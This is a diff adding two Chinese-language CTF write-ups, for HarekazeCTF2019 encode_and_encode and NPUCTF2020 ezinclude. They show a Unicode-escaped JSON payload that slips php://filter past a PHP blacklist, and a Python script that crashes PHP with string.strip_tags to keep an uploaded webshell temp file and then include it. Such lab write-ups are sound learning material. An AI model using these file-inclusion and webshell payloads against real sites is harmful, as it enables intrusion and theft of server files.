@@ -6696,6 +6696,78 @@ algorithm="none",key="").encode(encoding='utf-8')
 
  确定username为admin，且jwt为新生成的jwt后，放包，回到浏览器，访问`/api/flag`拿到flag：
 
+## BUUOJ [HarekazeCTF2019]encode_and_encode
+
+进来可以看到源码：
+
+正则匹配的是：
+
+```
+.. php: file: global: ... flag
+```
+
+具体是用`file_get_contents('php://input')`控制输入流，这里用Hack Bar做POST提交没有效果，使用Python或者Burp Suite就可以，且这个输入流要绕过正则匹配，并且是一个JSON编码的数组
+
+```php
+<?php
+error_reporting(0);
+
+if (isset($_GET['source'])) {
+    show_source(__FILE__);
+    exit();
+}
+
+function is_valid($str)
+{
+    $banword = [
+        // no path traversal
+        '\.\.',
+        // no stream wrapper
+        '(php|file|glob|data|tp|zip|zlib|phar):',
+        // no data exfiltration
+        'flag'
+    ];
+    $regexp = '/' . implode('|', $banword) . '/i';
+    if (preg_match($regexp, $str)) {
+        return false;
+    }
+    return true;
+}
+
+//$body = file_get_contents('php://input');           # 传入 JSON 编码后的 Array
+$body = '{"page":"index.php"}';
+$json = json_decode($body, true);               		# 返回 array
+
+if (is_valid($body) && isset($json) && isset($json['page'])) {
+    $page = $json['page'];
+    $content = file_get_contents($page);                # 如果失败，file_get_contents() 将返回 FALSE。
+    if (!$content || !is_valid($content)) {
+        $content = "<p>not found</p>\n";                
+    }
+} else {
+    $content = '<p>invalid request</p>';
+}
+
+// no data exfiltration!!!
+$content = preg_replace('/HarekazeCTF\{.+\}/i', 'HarekazeCTF{&lt;censored&gt;}', $content);
+echo json_encode(['content' => $content]);
+```
+
+**知识点：**` json_decode()`在解码JSON字符的同时，还会对Unicode做解码，利用这点就可以绕过第一个`is_valid`，如下：
+
+![image-20240222180732668](CTF.assets/image-20240222180732668.png)
+
+那么第二个`file_get_contents($page)`的话就可以使用伪协议来对内容做base64编码以绕过第二个`is_valid`
+
+```
+payload：
+{"page":"\u0070\u0068\u0070\u003a\u002f\u002f\u0066\u0069\u006c\u0074\u0065\u0072\u002f\u0072\u0065\u0061\u0064\u003d\u0063\u006f\u006e\u0076\u0065\u0072\u0074\u002e\u0062\u0061\u0073\u0065\u0036\u0034\u002d\u0065\u006e\u0063\u006f\u0064\u0065\u002f\u0072\u0065\u0073\u006f\u0075\u0072\u0063\u0065\u003d\u002f\u0066\u006c\u0061\u0067"}
+```
+
+![image-20240222181001970](CTF.assets/image-20240222181001970.png)
+
+
+
 # Misc
 
 ## János-the-Ripper-隐写-压缩包密码破解
@@ -6791,6 +6863,92 @@ flag{338f8ad6-ae9d-46d0-baea-197cd64dd18b}
 ```
 
 ![image-20231123163825303](CTF.assets/image-20231123163825303.png)
+
+## BUUOJ [NPUCTF2020]ezinclude
+
+进来查看源码可以看到一段提示，但是这个基本是`md5 === `是不能爆破出来的，后面看了一下wp，并拿到源码
+
+![image-20240222160659863](CTF.assets/image-20240222160659863.png)
+
+其实这里的逻辑就很奇怪，就是下一个相应包的Hash就是你的`pass`，就看你能不能猜到了
+
+```php
+index.php
+<?php
+include 'config.php';
+@$name=$_GET['name'];
+@$pass=$_GET['pass'];
+if(md5($secret.$name)===$pass){
+    echo '<script language="javascript" type="text/javascript">
+           window.location.href="flflflflag.php";
+	</script>
+';
+}else{
+    setcookie("Hash",md5($secret.$name),time()+3600000);
+    echo "username/password error";
+}
+?>
+<html>
+<!--md5($secret.$name)===$pass -->
+</html>
+
+```
+
+以此得到下一个网页并访问可以，且能直接使用`php://filter`拿到所有的源码
+
+![image-20240222161003674](CTF.assets/image-20240222161003674.png)
+
+```php
+# flflflflag.php
+<html>
+<head>
+    <script language="javascript" type="text/javascript">
+        window.location.href="404.html";
+    </script>
+    <title>this_is_not_fl4g_and_出题人_wants_girlfriend</title>
+</head>
+<>
+<body>
+<?php
+$file=$_GET['file'];
+if(preg_match('/data|input|zip/is',$file)){
+    die('nonono');
+}
+@include($file);
+echo 'include($_GET["file"])';
+?>
+</body>
+</html>
+
+```
+
+后面是利用`php7.0的bug`做一个上传webshell的操作了，可以参考下面这两个链接；简单来说就是：
+
+1. 如果没有上传口，只要我们构造出一个正确的POST数据包，我们也可以做文件上传操作
+2. 以这种方法上传的文件，由于PHP脚本没有做移动保存处理，所以只会存在`5s`，5秒后自动删除
+3. 在这5s的时间里，如果PHP崩溃或者清空内存栈的话，那么这个文件就会永久存在
+
+> - [PHP临时文件机制与利用的思考 - linuxsec - 博客园 (cnblogs.com)](https://www.cnblogs.com/linuxsec/articles/11278477.html)
+> - [关于php文件操作的几个小trick - tr1ple - 博客园 (cnblogs.com)](https://www.cnblogs.com/tr1ple/p/11301743.html)
+
+根据上面的思路，我们只要让PHP崩溃的同时上传shell文件，再回来使用`include`函数包含，就可以成功运行木马了
+
+```python
+import requests
+from io import BytesIO
+
+base_url = 'http://69b82027-d496-4ad5-8b6f-dbf95b056356.node5.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd'
+
+payload = '<?php phpinfo()?>'
+data = {
+    'file': BytesIO(payload.encode())           # 将字符串转换为字节流
+}
+
+req = requests.post(base_url, files=data)       # 这里需要使用 files 关键字而不是 data 关键字
+print(req.text)
+```
+
+最后直接在浏览器访问这个链接：`http://69b82027-d496-4ad5-8b6f-dbf95b056356.node5.buuoj.cn:81/flflflflag.php?file=/tmp/phpTkQIkF`并抓相应包就能看到FLAG了，不要用Burp Suite的重放，相应包好像回不来
 
 
 
